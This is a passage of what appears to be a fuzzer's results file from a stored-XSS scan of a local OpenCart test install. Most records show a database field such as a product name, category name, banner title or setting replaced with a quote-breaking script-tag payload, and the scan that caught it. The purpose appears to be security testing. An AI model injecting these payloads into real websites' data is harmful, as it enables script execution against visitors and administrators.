Power,&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tSystem sleep, wake&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tBrightness&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMonitor tilt&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Connectors and cables&lt;/b&gt;&lt;br&gt;\r\n\tCable&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tDVI (Digital Visual Interface)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tFireWire 400&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUSB 2.0&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tDC power (24 V)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\tConnectors&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo-port, self-powered USB 2.0 hub&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTwo FireWire 400 ports&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tKensington security port&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;VESA mount adapter&lt;/b&gt;&lt;br&gt;\r\n\tRequires optional Cinema Display VESA Mount Adapter (M9649G/A)&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tCompatible with VESA FDMI (MIS-D, 100, C) compliant mounting solutions&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Electrical requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tInput voltage: 100-240 VAC 50-60Hz&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMaximum power when operating: 150W&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEnergy saver mode: 3W or less&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Environmental requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tOperating temperature: 50° to 95° F (10° to 35° C)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tStorage temperature: -40° to 116° F (-40° to 47° C)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tOperating humidity: 20% to 80% noncondensing&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMaximum operating altitude: 10,000 feet&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Agency approvals&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tFCC Part 15 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN55022 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN55024&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tVCCI Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tAS/NZS 3548 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tCNS 13438 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tICES-003 Class B&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tISO 13406 part 2&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMPR II&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tIEC 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tUL 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tCSA 60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tEN60950&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tENERGY STAR&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tTCO '03&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;Size and weight&lt;/b&gt;&lt;br&gt;\r\n\t30-inch Apple Cinema HD Display&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tHeight: 21.3 inches (54.3 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWidth: 27.2 inches (68.8 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tDepth: 8.46 inches (21.5 cm)&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWeight: 27.5 pounds (12.5 kg)&lt;/li&gt;\r\n&lt;/ul&gt;\r\n&lt;p&gt;\r\n\t&lt;b&gt;System Requirements&lt;/b&gt;&lt;/p&gt;\r\n&lt;ul&gt;\r\n\t&lt;li&gt;\r\n\t\tMac Pro, all graphic options&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tMacBook Pro&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPower Mac G5 (PCI-X) with ATI Radeon 9650 or better or NVIDIA GeForce 6800 GT DDL or better&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPower Mac G5 (PCI Express), all graphics options&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tPowerBook G4 with dual-link DVI support&lt;/li&gt;\r\n\t&lt;li&gt;\r\n\t\tWindows PC and graphics card that supports DVI ports with dual-link digital bandwidth and VESA DDC standard for plug-and-play setup&lt;/li&gt;\r\n&lt;/ul&gt;\r\n"", '', 'Apple Cinema 30', '', '']
            change: 'Apple Cinema 30&quot;' => '""'><script>xss(919678)</script>'
            
fuzzed after scan 88 / 345
found as XSS in scan 89 / 345"
opencart,oc_product_description.name,http://localhost/,919966,"""'><script>xss(919966)</script>","
            opencart.oc_product_description.name[12][2]
            original row: [43, 1, 'MacBook', '&lt;div&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Intel Core 2 Duo processor&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tPowered by an Intel Core 2 Duo processor at speeds up to 2.16GHz, the new MacBook is the fastest ever.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;1GB memory, larger hard drives&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tThe new MacBook now comes with 1GB of memory standard and larger hard drives for the entire line perfect for running more of your favorite applications and storing growing media collections.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Sleek, 1.08-inch-thin design&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tMacBook makes it easy to hit the road thanks to its tough polycarbonate case, built-in wireless technologies, and innovative MagSafe Power Adapter that releases automatically if someone accidentally trips on the cord.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Built-in iSight camera&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tRight out of the box, you can have a video chat with friends or family,2 record a video at your desk, or take fun pictures with Photo Booth&lt;/p&gt;\r\n&lt;/div&gt;\r\n', '', 'MacBook', '', '']
            fuzzed row: [43, 1, '""\'><script>xss(919966)</script>', '&lt;div&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Intel Core 2 Duo processor&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tPowered by an Intel Core 2 Duo processor at speeds up to 2.16GHz, the new MacBook is the fastest ever.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;1GB memory, larger hard drives&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tThe new MacBook now comes with 1GB of memory standard and larger hard drives for the entire line perfect for running more of your favorite applications and storing growing media collections.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Sleek, 1.08-inch-thin design&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tMacBook makes it easy to hit the road thanks to its tough polycarbonate case, built-in wireless technologies, and innovative MagSafe Power Adapter that releases automatically if someone accidentally trips on the cord.&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\t&lt;b&gt;Built-in iSight camera&lt;/b&gt;&lt;/p&gt;\r\n\t&lt;p&gt;\r\n\t\tRight out of the box, you can have a video chat with friends or family,2 record a video at your desk, or take fun pictures with Photo Booth&lt;/p&gt;\r\n&lt;/div&gt;\r\n', '', 'MacBook', '', '']
            change: 'MacBook' => '""'><script>xss(919966)</script>'
            
fuzzed after scan 88 / 345
found as XSS in scan 89 / 345"
opencart,oc_banner_image.title,http://localhost/,920732,"""'><script>xss(920732)</script>","
            opencart.oc_banner_image.title[1][3]
            original row: [80, 7, 1, 'MacBookAir', '', 'catalog/demo/banners/MacBookAir.jpg', 0]
            fuzzed row: [80, 7, 1, '""\'><script>xss(920732)</script>', '', 'catalog/demo/banners/MacBookAir.jpg', 0]
            change: 'MacBookAir' => '""'><script>xss(920732)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_banner_image.title,http://localhost/,923055,"""'><script>xss(923055)</script>","
            opencart.oc_banner_image.title[7][3]
            original row: [92, 8, 1, 'Burger King', '', 'catalog/demo/manufacturer/burgerking.png', 0]
            fuzzed row: [92, 8, 1, '""\'><script>xss(923055)</script>', '', 'catalog/demo/manufacturer/burgerking.png', 0]
            change: 'Burger King' => '""'><script>xss(923055)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_category_description.name,http://localhost/,925168,"""'><script>xss(925168)</script>","
            opencart.oc_category_description.name[28][2]
            original row: [49, 1, 'test 17', '', 'test 17', '', '']
            fuzzed row: [49, 1, '""\'><script>xss(925168)</script>', '', 'test 17', '', '']
            change: 'test 17' => '""'><script>xss(925168)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,925400,"""'><script>xss(925400)</script>","
            opencart.oc_category_description.name[0][2]
            original row: [17, 1, 'Software', '', 'Software', '', '']
            fuzzed row: [17, 1, '""\'><script>xss(925400)</script>', '', 'Software', '', '']
            change: 'Software' => '""'><script>xss(925400)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,926247,"""'><script>xss(926247)</script>","
            opencart.oc_category_description.name[22][2]
            original row: [43, 1, 'test 11', '', 'test 11', '', '']
            fuzzed row: [43, 1, '""\'><script>xss(926247)</script>', '', 'test 11', '', '']
            change: 'test 11' => '""'><script>xss(926247)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.title,http://localhost/,927291,"""'><script>xss(927291)</script>","
            opencart.oc_banner_image.title[13][3]
            original row: [98, 8, 1, 'Nintendo', '', 'catalog/demo/manufacturer/nintendo.png', 0]
            fuzzed row: [98, 8, 1, '""\'><script>xss(927291)</script>', '', 'catalog/demo/manufacturer/nintendo.png', 0]
            change: 'Nintendo' => '""'><script>xss(927291)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_category_description.name,http://localhost/,929672,"""'><script>xss(929672)</script>","
            opencart.oc_category_description.name[19][2]
            original row: [40, 1, 'test 7', '', 'test 7', '', '']
            fuzzed row: [40, 1, '""\'><script>xss(929672)</script>', '', 'test 7', '', '']
            change: 'test 7' => '""'><script>xss(929672)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,930737,"""'><script>xss(930737)</script>","
            opencart.oc_category_description.name[16][2]
            original row: [37, 1, 'test 5', '', 'test 5', '', '']
            fuzzed row: [37, 1, '""\'><script>xss(930737)</script>', '', 'test 5', '', '']
            change: 'test 5' => '""'><script>xss(930737)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,931110,"""'><script>xss(931110)</script>","
            opencart.oc_category_description.name[10][2]
            original row: [31, 1, 'Scanners', '', 'Scanners', '', '']
            fuzzed row: [31, 1, '""\'><script>xss(931110)</script>', '', 'Scanners', '', '']
            change: 'Scanners' => '""'><script>xss(931110)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,931359,"""'><script>xss(931359)</script>","
            opencart.oc_category_description.name[36][2]
            original row: [57, 1, 'Tablets', '', 'Tablets', '', '']
            fuzzed row: [57, 1, '""\'><script>xss(931359)</script>', '', 'Tablets', '', '']
            change: 'Tablets' => '""'><script>xss(931359)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_information_description.title,http://localhost/,934800,"""'><script>xss(934800)</script>","
            opencart.oc_information_description.title[0][2]
            original row: [1, 1, 'About Us', '&lt;p&gt;\r\n\tAbout Us&lt;/p&gt;\r\n', 'About Us', '', '']
            fuzzed row: [1, 1, '""\'><script>xss(934800)</script>', '&lt;p&gt;\r\n\tAbout Us&lt;/p&gt;\r\n', 'About Us', '', '']
            change: 'About Us' => '""'><script>xss(934800)</script>'
            
fuzzed after scan 58 / 345
found as XSS in scan 59 / 345"
opencart,oc_category_description.name,http://localhost/,936188,"""'><script>xss(936188)</script>","
            opencart.oc_category_description.name[34][2]
            original row: [55, 1, 'test 23', '', 'test 23', '', '']
            fuzzed row: [55, 1, '""\'><script>xss(936188)</script>', '', 'test 23', '', '']
            change: 'test 23' => '""'><script>xss(936188)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.link,http://localhost/,941744,"""'><script>xss(941744)</script>","
            opencart.oc_banner_image.link[1][4]
            original row: [80, 7, 1, 'MacBookAir', '', 'catalog/demo/banners/MacBookAir.jpg', 0]
            fuzzed row: [80, 7, 1, 'MacBookAir', '""\'><script>xss(941744)</script>', 'catalog/demo/banners/MacBookAir.jpg', 0]
            change: '' => '""'><script>xss(941744)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_category_description.name,http://localhost/,946649,"""'><script>xss(946649)</script>","
            opencart.oc_category_description.name[25][2]
            original row: [46, 1, 'Macs', '', 'Macs', '', '']
            fuzzed row: [46, 1, '""\'><script>xss(946649)</script>', '', 'Macs', '', '']
            change: 'Macs' => '""'><script>xss(946649)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,946667,"""'><script>xss(946667)</script>","
            opencart.oc_category_description.name[33][2]
            original row: [54, 1, 'test 22', '', 'test 22', '', '']
            fuzzed row: [54, 1, '""\'><script>xss(946667)</script>', '', 'test 22', '', '']
            change: 'test 22' => '""'><script>xss(946667)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_product_description.name,http://localhost/,949300,"""'><script>xss(949300)</script>","
            opencart.oc_product_description.name[2][2]
            original row: [30, 1, 'Canon EOS 5D', ""&lt;p&gt;\r\n\tCanon's press material for the EOS 5D states that it 'defines (a) new D-SLR category', while we're not typically too concerned with marketing talk this particular statement is clearly pretty accurate. The EOS 5D is unlike any previous digital SLR in that it combines a full-frame (35 mm sized) high resolution sensor (12.8 megapixels) with a relatively compact body (slightly larger than the EOS 20D, although in your hand it feels noticeably 'chunkier'). The EOS 5D is aimed to slot in between the EOS 20D and the EOS-1D professional digital SLR's, an important difference when compared to the latter is that the EOS 5D doesn't have any environmental seals. While Canon don't specifically refer to the EOS 5D as a 'professional' digital SLR it will have obvious appeal to professionals who want a high quality digital SLR in a body lighter than the EOS-1D. It will also no doubt appeal to current EOS 20D owners (although lets hope they've not bought too many EF-S lenses...) äë&lt;/p&gt;\r\n"", '', 'sdf', '', '']
            fuzzed row: [30, 1, '""\'><script>xss(949300)</script>', ""&lt;p&gt;\r\n\tCanon's press material for the EOS 5D states that it 'defines (a) new D-SLR category', while we're not typically too concerned with marketing talk this particular statement is clearly pretty accurate. The EOS 5D is unlike any previous digital SLR in that it combines a full-frame (35 mm sized) high resolution sensor (12.8 megapixels) with a relatively compact body (slightly larger than the EOS 20D, although in your hand it feels noticeably 'chunkier'). The EOS 5D is aimed to slot in between the EOS 20D and the EOS-1D professional digital SLR's, an important difference when compared to the latter is that the EOS 5D doesn't have any environmental seals. While Canon don't specifically refer to the EOS 5D as a 'professional' digital SLR it will have obvious appeal to professionals who want a high quality digital SLR in a body lighter than the EOS-1D. It will also no doubt appeal to current EOS 20D owners (although lets hope they've not bought too many EF-S lenses...) äë&lt;/p&gt;\r\n"", '', 'sdf', '', '']
            change: 'Canon EOS 5D' => '""'><script>xss(949300)</script>'
            
fuzzed after scan 88 / 345
found as XSS in scan 89 / 345"
opencart,oc_banner_image.link,http://localhost/,951525,"""'><script>xss(951525)</script>","
            opencart.oc_banner_image.link[3][4]
            original row: [88, 8, 1, 'Harley Davidson', '', 'catalog/demo/manufacturer/harley.png', 0]
            fuzzed row: [88, 8, 1, 'Harley Davidson', '""\'><script>xss(951525)</script>', 'catalog/demo/manufacturer/harley.png', 0]
            change: '' => '""'><script>xss(951525)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_information_description.title,http://localhost/,952461,"""'><script>xss(952461)</script>","
            opencart.oc_information_description.title[1][2]
            original row: [2, 1, 'Terms &amp; Conditions', '&lt;p&gt;\r\n\tTerms &amp;amp; Conditions&lt;/p&gt;\r\n', 'Terms &amp; Conditions', '', '']
            fuzzed row: [2, 1, '""\'><script>xss(952461)</script>', '&lt;p&gt;\r\n\tTerms &amp;amp; Conditions&lt;/p&gt;\r\n', 'Terms &amp; Conditions', '', '']
            change: 'Terms &amp; Conditions' => '""'><script>xss(952461)</script>'
            
fuzzed after scan 58 / 345
found as XSS in scan 59 / 345"
opencart,oc_category_description.name,http://localhost/,952767,"""'><script>xss(952767)</script>","
            opencart.oc_category_description.name[1][2]
            original row: [18, 1, 'Laptops &amp; Notebooks', '&lt;p&gt;\r\n\tShop Laptop feature only the best laptop deals on the market. By comparing laptop deals from the likes of PC World, Comet, Dixons, The Link and Carphone Warehouse, Shop Laptop has the most comprehensive selection of laptops on the internet. At Shop Laptop, we pride ourselves on offering customers the very best laptop deals. From refurbished laptops to netbooks, Shop Laptop ensures that every laptop - in every colour, style, size and technical spec - is featured on the site at the lowest possible price.&lt;/p&gt;\r\n', 'Laptops &amp; Notebooks', '', '']
            fuzzed row: [18, 1, '""\'><script>xss(952767)</script>', '&lt;p&gt;\r\n\tShop Laptop feature only the best laptop deals on the market. By comparing laptop deals from the likes of PC World, Comet, Dixons, The Link and Carphone Warehouse, Shop Laptop has the most comprehensive selection of laptops on the internet. At Shop Laptop, we pride ourselves on offering customers the very best laptop deals. From refurbished laptops to netbooks, Shop Laptop ensures that every laptop - in every colour, style, size and technical spec - is featured on the site at the lowest possible price.&lt;/p&gt;\r\n', 'Laptops &amp; Notebooks', '', '']
            change: 'Laptops &amp; Notebooks' => '""'><script>xss(952767)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.link,http://localhost/,956519,"""'><script>xss(956519)</script>","
            opencart.oc_banner_image.link[9][4]
            original row: [94, 8, 1, 'NFL', '', 'catalog/demo/manufacturer/nfl.png', 0]
            fuzzed row: [94, 8, 1, 'NFL', '""\'><script>xss(956519)</script>', 'catalog/demo/manufacturer/nfl.png', 0]
            change: '' => '""'><script>xss(956519)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_category_description.name,http://localhost/,960151,"""'><script>xss(960151)</script>","
            opencart.oc_category_description.name[13][2]
            original row: [34, 1, 'MP3 Players', '&lt;p&gt;\r\n\tShop Laptop feature only the best laptop deals on the market. By comparing laptop deals from the likes of PC World, Comet, Dixons, The Link and Carphone Warehouse, Shop Laptop has the most comprehensive selection of laptops on the internet. At Shop Laptop, we pride ourselves on offering customers the very best laptop deals. From refurbished laptops to netbooks, Shop Laptop ensures that every laptop - in every colour, style, size and technical spec - is featured on the site at the lowest possible price.&lt;/p&gt;\r\n', 'MP3 Players', '', '']
            fuzzed row: [34, 1, '""\'><script>xss(960151)</script>', '&lt;p&gt;\r\n\tShop Laptop feature only the best laptop deals on the market. By comparing laptop deals from the likes of PC World, Comet, Dixons, The Link and Carphone Warehouse, Shop Laptop has the most comprehensive selection of laptops on the internet. At Shop Laptop, we pride ourselves on offering customers the very best laptop deals. From refurbished laptops to netbooks, Shop Laptop ensures that every laptop - in every colour, style, size and technical spec - is featured on the site at the lowest possible price.&lt;/p&gt;\r\n', 'MP3 Players', '', '']
            change: 'MP3 Players' => '""'><script>xss(960151)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.link,http://localhost/,960739,"""'><script>xss(960739)</script>","
            opencart.oc_banner_image.link[4][4]
            original row: [89, 8, 1, 'Dell', '', 'catalog/demo/manufacturer/dell.png', 0]
            fuzzed row: [89, 8, 1, 'Dell', '""\'><script>xss(960739)</script>', 'catalog/demo/manufacturer/dell.png', 0]
            change: '' => '""'><script>xss(960739)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_category_description.name,http://localhost/,961210,"""'><script>xss(961210)</script>","
            opencart.oc_category_description.name[9][2]
            original row: [30, 1, 'Printers', '', 'Printers', '', '']
            fuzzed row: [30, 1, '""\'><script>xss(961210)</script>', '', 'Printers', '', '']
            change: 'Printers' => '""'><script>xss(961210)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.title,http://localhost/,961634,"""'><script>xss(961634)</script>","
            opencart.oc_banner_image.title[5][3]
            original row: [90, 8, 1, 'Disney', '', 'catalog/demo/manufacturer/disney.png', 0]
            fuzzed row: [90, 8, 1, '""\'><script>xss(961634)</script>', '', 'catalog/demo/manufacturer/disney.png', 0]
            change: 'Disney' => '""'><script>xss(961634)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_category_description.name,http://localhost/,962717,"""'><script>xss(962717)</script>","
            opencart.oc_category_description.name[12][2]
            original row: [33, 1, 'Cameras', '', 'Cameras', '', '']
            fuzzed row: [33, 1, '""\'><script>xss(962717)</script>', '', 'Cameras', '', '']
            change: 'Cameras' => '""'><script>xss(962717)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.title,http://localhost/,965240,"""'><script>xss(965240)</script>","
            opencart.oc_banner_image.title[0][3]
            original row: [79, 7, 1, 'iPhone 6', 'index.php?route=product/product&amp;path=57&amp;product_id=49', 'catalog/demo/banners/iPhone6.jpg', 0]
            fuzzed row: [79, 7, 1, '""\'><script>xss(965240)</script>', 'index.php?route=product/product&amp;path=57&amp;product_id=49', 'catalog/demo/banners/iPhone6.jpg', 0]
            change: 'iPhone 6' => '""'><script>xss(965240)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_setting.value,http://localhost/,966809,"""'><script>xss(966809)</script>","
            opencart.oc_setting.value[96][4]
            original row: [99, 0, 'config', 'config_name', 'Your Store', 0]
            fuzzed row: [99, 0, 'config', 'config_name', '""\'><script>xss(966809)</script>', 0]
            change: 'Your Store' => '""'><script>xss(966809)</script>'
            
fuzzed after scan 121 / 345
found as XSS in scan 122 / 345"
opencart,oc_category_description.name,http://localhost/,966983,"""'><script>xss(966983)</script>","
            opencart.oc_category_description.name[27][2]
            original row: [48, 1, 'test 16', '', 'test 16', '', '']
            fuzzed row: [48, 1, '""\'><script>xss(966983)</script>', '', 'test 16', '', '']
            change: 'test 16' => '""'><script>xss(966983)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_category_description.name,http://localhost/,967484,"""'><script>xss(967484)</script>","
            opencart.oc_category_description.name[24][2]
            original row: [45, 1, 'Windows', '', 'Windows', '', '']
            fuzzed row: [45, 1, '""\'><script>xss(967484)</script>', '', 'Windows', '', '']
            change: 'Windows' => '""'><script>xss(967484)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_setting.value,"http://localhost/new_admin/
http://localhost/new_admin/index.php?route=common/forgotten
http://localhost/new_admin/index.php?route=common/forgotten|confirm
http://localhost/new_admin/index.php?route=common/login
http://localhost/new_admin/index.php?route=common/login|login&login_token=0d6f9e994b358329a9325b6d43aa0f46
http://localhost/new_admin/index.php?route=common/login|login&login_token=0ddf66ddc2c84237d77ef5e12ff34465
http://localhost/new_admin/index.php?route=common/login|login&login_token=0f28abc43f9d34990293505af34584c5
http://localhost/new_admin/index.php?route=common/login|login&login_token=172c421e3580864a8c96c498d185f7eb
http://localhost/new_admin/index.php?route=common/login|login&login_token=23b36b49a20d9683d71f24c54e520d85
http://localhost/new_admin/index.php?route=common/login|login&login_token=3d0b8b6edb7102a5cd1416f800ba7446
http://localhost/new_admin/index.php?route=common/login|login&login_token=41b43dbe6b772a134171b27d52d3796b
http://localhost/new_admin/index.php?route=common/login|login&login_token=647946a7ec32086d50ea5932d0706b61
http://localhost/new_admin/index.php?route=common/login|login&login_token=69206b822287227580e532c887fd3e42
http://localhost/new_admin/index.php?route=common/login|login&login_token=a405472acde63d4d4f50eadbcbfea6a8
http://localhost/new_admin/index.php?route=common/login|login&login_token=a8e4e6a4aad10b27b6f66fa121b156d6
http://localhost/new_admin/index.php?route=common/login|login&login_token=aa99d2d0fb08d4b425ea0fb38ab310d2
http://localhost/new_admin/index.php?route=common/login|login&login_token=af8e568cc0bc3f2acc11ded121b5165f
http://localhost/new_admin/index.php?route=common/login|login&login_token=b5424ffba760757d62937563e014c63b
http://localhost/new_admin/index.php?route=common/login|login&login_token=b5971b7d5d0ce3f1eafd1cd1a1c8325c
http://localhost/new_admin/index.php?route=common/login|login&login_token=c5d1e69744643d9c9c3c7faae959c2e3
http://localhost/new_admin/index.php?route=common/login|login&login_token=d3a32a598f0999c1016331fe27039c3a
http://localhost/new_admin/index.php?route=common/login|login&login_token=d4953fb6789f256f94dc1d232beb0a34
http://localhost/new_admin/index.php?route=common/login|login&login_token=e23fe031c0394a725387f92f819090f2
http://localhost/new_admin/index.php?route=common/login|login&login_token=ef52e133a56b32dff14a62c38e51c7bc
http://localhost/new_admin/index.php?route=common/login|login&login_token=ef595f5f1ce168508f74bba18601a4ef
http://localhost/new_admin/index.php?route=common/login|login&login_token=f3ddc67216db9bcca8a1ac001f179db8
http://localhost/new_admin/index.php?route=common/login|login&login_token=f997d60817c86c17125389fc6e4d3a5f",967602,"""'><script>xss(967602)</script>","
            opencart.oc_setting.value[14][4]
            original row: [15, 0, 'config', 'config_language_admin', 'en-gb', 0]
            fuzzed row: [15, 0, 'config', 'config_language_admin', '""\'><script>xss(967602)</script>', 0]
            change: 'en-gb' => '""'><script>xss(967602)</script>'
            
fuzzed after scan 120 / 345
found as XSS in scan 121 / 345"
opencart,oc_category_description.name,http://localhost/,967808,"""'><script>xss(967808)</script>","
            opencart.oc_category_description.name[32][2]
            original row: [53, 1, 'test 21', '', 'test 21', '', '']
            fuzzed row: [53, 1, '""\'><script>xss(967808)</script>', '', 'test 21', '', '']
            change: 'test 21' => '""'><script>xss(967808)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_product_description.name,http://localhost/,968020,"""'><script>xss(968020)</script>","
            opencart.oc_product_description.name[9][2]
            original row: [40, 1, 'iPhone', '&lt;p class=&quot;intro&quot;&gt;\r\n\tiPhone is a revolutionary new mobile phone that allows you to make a call by simply tapping a name or number in your address book, a favorites list, or a call log. It also automatically syncs all your contacts from a PC, Mac, or Internet service. And it lets you select and listen to voicemail messages in whatever order you want just like email.&lt;/p&gt;\r\n', '', 'iPhone', '', '']
            fuzzed row: [40, 1, '""\'><script>xss(968020)</script>', '&lt;p class=&quot;intro&quot;&gt;\r\n\tiPhone is a revolutionary new mobile phone that allows you to make a call by simply tapping a name or number in your address book, a favorites list, or a call log. It also automatically syncs all your contacts from a PC, Mac, or Internet service. And it lets you select and listen to voicemail messages in whatever order you want just like email.&lt;/p&gt;\r\n', '', 'iPhone', '', '']
            change: 'iPhone' => '""'><script>xss(968020)</script>'
            
fuzzed after scan 88 / 345
found as XSS in scan 89 / 345"
opencart,oc_category_description.name,http://localhost/,968759,"""'><script>xss(968759)</script>","
            opencart.oc_category_description.name[21][2]
            original row: [42, 1, 'test 9', '', 'test 9', '', '']
            fuzzed row: [42, 1, '""\'><script>xss(968759)</script>', '', 'test 9', '', '']
            change: 'test 9' => '""'><script>xss(968759)</script>'
            
fuzzed after scan 11 / 345
found as XSS in scan 12 / 345"
opencart,oc_banner_image.title,http://localhost/,969991,"""'><script>xss(969991)</script>","
            opencart.oc_banner_image.title[11][3]
            original row: [96, 8, 1, 'Sony', '', 'catalog/demo/manufacturer/sony.png', 0]
            fuzzed row: [96, 8, 1, '""\'><script>xss(969991)</script>', '', 'catalog/demo/manufacturer/sony.png', 0]
            change: 'Sony' => '""'><script>xss(969991)</script>'
            
fuzzed after scan 7 / 345
found as XSS in scan 8 / 345"
opencart,oc_banner_image.link,http://localhost/,971152,"""'><script>xss(971152)</script>","
            opencart.oc_banner_image.link[13][4]
            original row: [98, 8, 1, 'Nintendo', '', 'catalog/demo/manufacturer/nintendo.png', 0]
            fuzzed row: [98, 8, 1, 'Nintendo', '""\'><script>xss(971152)</script>', 'catalog/demo/manufacturer/nintendo.png', 0]
            change: '' => '""'><script>xss(971152)</script>'
            
fuzzed after scan 8 / 345
found as XSS in scan 9 / 345"
opencart,oc_category_description.name,http://localhost/,974110,"""'><script>xss(974110)</script>","
            opencart.oc_category_description.name[11][2]
